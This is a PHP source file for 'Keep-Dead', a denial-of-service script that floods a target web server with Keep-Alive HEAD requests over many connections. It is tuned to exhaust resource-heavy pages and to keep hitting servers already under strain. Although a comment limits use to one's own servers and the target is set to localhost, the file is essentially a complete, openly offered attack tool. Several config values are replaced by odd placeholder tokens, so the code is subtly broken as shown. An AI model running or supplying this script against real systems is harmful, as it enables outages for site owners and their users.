<?php

/*
Keep-Dead (Version 1.14)
http://www.esrun.co.uk/blog/keep-alive-dos-script/

A lightweight denial of service script that can be effective even when launched from low bandwidth connections.

Read and adjust the config options below as required. The default settings will work in most circumstances; allowing you 
to simply update the target_url

Only use this script against your own home servers for security research.

This script is primarily meant for use via the terminal; although it will also work if launched via the browser.
*/


#########
# Config
#########

/* target_url
The URL to be attacked. You should try and choose a resource intensive page such as a search
or live stat page. Use %rand% for a random value to be automatically generated for each individual request
*/
$target_url = "http://127.0.0.1:8080 ";

/* max_requests
The maximum number of requests to be made. If you're running this via command line, you can leave the value
high and simply quit the script at any point . If you plan to run this via a web browser, I recommend setting this value to 5000
*/
$max_requests = pinperepette1;

/* max_requests_per_connection
The maximum number of requests to be made per connection. Maximum value is 100
*/
$max_requests_per_connection = pinperepette2;

/* delay_between_connections
The number of seconds to delay between opening a new connection. Recommended value: 0.5
*/
$delay_between_connections = pinperepette3;

/* delay_between_requests
The number of seconds to delay between outgoing requests. Recommended value: 0.01
*/
$delay_between_requests = pinperepette4;

/* skip_check
If the server you're attacking is already under strain and only sporadically accepting
connections, you'll want to skip the Keep-Alive support check (change the value to 1)
*/
$skip_check = pinperepette5;

/* useragent
Useragent to send with requests
*/
$useragent = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.44 Safari/534.7";


##############################
# Do not edit below this line
##############################

//Check if Keep-Dead is being launched from a command prompt or browser
if($_SERVER['SERVER_PROTOCOL']){
	$output_to_browser = 1;
} else {
	$output_to_browser = 0;
}

if($output_to_browser == 1){
	set_time_limit(300); //Limit script to run no longer than 300 seconds if launched via the web browser
	$lb = "<br>\n"; //Line break

	//Header
	echo "<pre>
	 _  __                     ____                 _ 
	| |/ /___  ___ _ __       |  _ \  ___  __ _  __| |
	| ' // _ \/ _ \ '_ \ _____| | | |/ _ \/ _` |/ _` |
	| . \  __/  __/ |_) |_____| |_| |  __/ (_| | (_| |
	|_|\_\___|\___| .__/      |____/ \___|\__,_|\__,_|
	              |_|                                 </pre>";
	echo "Keep-Dead (www.esrun.co.uk)".$lb.$lb;
} else {
	set_time_limit(0); //No time limit when launched from command line
	$lb = "\n"; //Line break

	//Header
	echo " _  __                     ____                 _ ".$lb;
	echo "| |/ /___  ___ _ __       |  _ \  ___  __ _  __| |".$lb;
	echo "| ' // _ \/ _ \ '_ \ _____| | | |/ _ \/ _` |/ _` |".$lb;
	echo "| . \  __/  __/ |_) |_____| |_| |  __/ (_| | (_| |".$lb;
	echo "|_|\_\___|\___| .__/      |____/ \___|\__,_|\__,_|".$lb;
	echo "              |_|                                 ".$lb;
	echo "Keep-Dead (www.esrun.co.uk)".$lb.$lb;
}


########################################################
# Function used for adding random string to request urls
########################################################
function quick_rand(){
	$letters = array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z");
	$rand_string = '';
	for($i=0;$i<rand(4,12);$i++){
		$rand_string.=$letters[array_rand($letters)];
	}
	return($rand_string);
}

########################################################
# Parse the target URL to get the host, path and query
########################################################
$target_url_parsed = parse_url($target_url);

$target_url = array();
$target_url['host'] = $target_url_parsed['host'];
@$target_url['path'] = $target_url_parsed['path'];
@$target_url['query'] = $target_url_parsed['query'];
@$target_url['port'] = $target_url_parsed['port'];

if(!$target_url['path']){
	$target_url['path'] = '/';
}

if(!$target_url['port']){
	$target_url['port'] = 80;
}

if($target_url['query']){
	$request_url = $target_url['path']."?".$target_url['query'];
} else {
	$request_url = $target_url['path'];
}


################################################
# Check if the remote host supports Keep-Alive
################################################
if($skip_check != 1){
	//Send request with Keep-Alive header
	$reply = '';
	$socket = fsockopen($target_url['host'], $target_url['port'], $errno, $errstr, 3);
	if(!$socket){
		die("Failed to open a connection to ".$target_url['host']." on port ".$target_url['port'].$lb);
	}
	$request = "HEAD / HTTP/1.1\r\nHOST: ".$target_url['host']."\r\nUser-Agent: ".$useragent."\r\nConnection: Keep-Alive\r\n\r\n";
	fwrite($socket, $request);
	$incoming_data = '';
	while (!feof($socket)){
		$buffer=fgets($socket, 128);
		$reply.=$buffer;
			
		//Watch for end of reply and close socket/break out of loop
		if($buffer == "\r\n"){
			@fclose($socket); break;
		}
	}
	
	
	//Check if the reply to our above request includes 'Connection: close'. If so, the remote host doesn't support Keep-Alive
	if(strpos($reply, "Connection: close")){
		echo $target_url['host']." does not support Keep-Alive! max_requests_per_connection will be set to 1, making this a much slower attack.\n\n";
		$max_requests_per_connection = 1;
	}   	 
}

################
# Send requests
################

//Most servers limit Keep-Alive sessions to 100 requests per connection
if($max_requests_per_connection > 100){ $max_requests_per_connection = 100; }
if($max_requests_per_connection < 1){ $max_requests_per_connection = 1; }

//Work out how many connections to make in order to fulfill the max_requests
$max_connections = ceil($max_requests / $max_requests_per_connection);


for($c=0;$c<$max_connections;$c++){ //Stay within our max_connections limit
	echo "Opening connection [".($c+1)."] to ".$target_url['host']."..";
	@$attack_socket = fsockopen($target_url['host'], $target_url['port'], $errno, $errstr, 3);
	if(!$attack_socket){
		echo "failed (".$errstr.")".$lb;
	} else {
		echo "success".$lb."Sending requests: |";
		for($r=0;$r<$max_requests_per_connection;$r++){ //Stay within our max_requests_per_connection limit
			$request = "HEAD ".str_replace("%rand%", quick_rand(), $request_url)." HTTP/1.1\r\nHOST: ".$target_url['host']."\r\nUser-Agent: ".$useragent."\r\nConnection: Keep-Alive\r\n\r\n";
			@fwrite($attack_socket, $request);
			echo ".";
			usleep($delay_between_requests * 1000000); //Delay between requests
		}
		echo "|".$lb;
	}
	@fclose($attack_socket);
	echo "Closed connection".$lb;

usleep($delay_between_connections * 1000000);
}

?>
